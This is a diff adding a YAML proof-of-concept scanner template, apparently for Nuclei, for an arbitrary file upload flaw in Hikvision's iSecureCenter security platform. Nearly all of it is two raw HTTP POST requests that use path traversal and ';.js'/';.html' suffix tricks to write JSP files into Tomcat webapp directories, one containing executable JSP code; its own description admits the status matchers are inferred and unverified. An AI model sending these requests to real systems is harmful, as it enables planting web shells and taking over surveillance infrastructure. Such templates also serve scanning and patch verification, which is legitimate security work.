@@ -1,0 +1,71 @@
+id: poc-4898d9acfef74d5f95e4
+info:
+  name: 海康威视iSecureCenter综合安防管理平台center任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4898d9acfef74d5f95e48fb17f0486e7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4898d9acfef74d5f95e48fb17f0486e7
+    fofa: '**hunter查询语法：**'
+http:
+- raw:
+  - 'POST /center/api/files;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: python-requests/2.26.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close
+
+    Content-Length: 257
+
+    Content-Type: multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c
+
+
+    --ea26cdac4990498b32d7a95ce5a5135c
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    332299402
+
+    --ea26cdac4990498b32d7a95ce5a5135c--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /center/api/files;.html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+
+    ------WebKitFormBoundary9PggsiM755PLa54a
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+
+    Content-Type: application/zip
+
+
+    <%out.print("test3");%>
+
+
+    ------WebKitFormBoundary9PggsiM755PLa54a--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
